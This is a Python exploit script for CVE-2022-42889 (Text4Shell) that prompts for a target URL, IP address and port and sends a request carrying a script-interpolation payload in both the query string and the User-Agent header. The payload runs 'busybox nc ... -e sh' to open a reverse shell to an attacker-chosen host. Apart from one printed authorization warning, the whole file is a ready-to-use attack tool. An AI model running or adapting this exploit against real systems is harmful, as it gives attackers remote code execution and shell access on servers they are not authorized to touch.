import requests
import time
import sys
from urllib.parse import quote_plus

# Colors for terminal output
class TerminalColors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

def print_banner():
    banner = """
    
████████╗███████╗██╗  ██╗████████╗██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
╚══██╔══╝██╔════╝╚██╗██╔╝╚══██╔══╝██║  ██║██╔════╝██║  ██║██╔════╝██║     ██║     
   ██║   █████╗   ╚███╔╝    ██║   ███████║███████╗███████║█████╗  ██║     ██║     
   ██║   ██╔══╝   ██╔██╗    ██║   ╚════██║╚════██║██╔══██║██╔══╝  ██║     ██║     
   ██║   ███████╗██╔╝ ██╗   ██║        ██║███████║██║  ██║███████╗███████╗███████╗
   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝        ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

    CVE-2022-42889 Exploit Script      |      SICARI0  23
    """
    print(f"{TerminalColors.GREEN}{banner}{TerminalColors.RESET}")

def get_user_input():
    print_banner()
    print(f"{TerminalColors.RED}WARNING:{TerminalColors.RESET} This script is intended to be used for vulnerability testing purposes only. Ensure you're authorized to run your payload on the target prior to using this script!")
    print(f"Exit now if you are not authorized.")
    
    # Get user input for target, IP address, and port
    target = input("Enter the target URL: ")
    ip_address = input("Enter IP address: ")
    port = input("Enter port: ")
    
    return target, ip_address, port

def CVE_2022_42889(target, ip_address, port):
    try:
        # Construct the URL with the payload
        payload = f"search?query=${{script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc {ip_address} {port} -e sh')}}"
        url = f"{target}/{payload}"
        ua = f"${{script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc {ip_address} {port} -e sh')}}"
        header = {'User-Agent': ua}
        # Send the HTTP request
        response = requests.get(url, headers=header, verify=False)
        print("\n[+] URL: ", url)
        print(f"[+] HTTP Status: {TerminalColors.GREEN}{response.status_code}{TerminalColors.RESET}")
        print(f"[+] HTTP Text: {TerminalColors.GREEN}{response.text}{TerminalColors.RESET}")
    except Exception as pocEx:
        print("\n[!] Exception occurred: ", pocEx, url)
        print(f"[{TerminalColors.RED}ERROR{TerminalColors.RESET}] Exploit failed for target: {target}\n")

def main():
    target, ip_address, port = get_user_input()

    try:
        CVE_2022_42889(target, ip_address, port)
    except Exception as mainEx:
        print(f"\n[{TerminalColors.RED}ERROR{TerminalColors.RESET}] Exception occurred in main: {mainEx}")
        sys.exit(1)

if __name__ == "__main__":
    main()
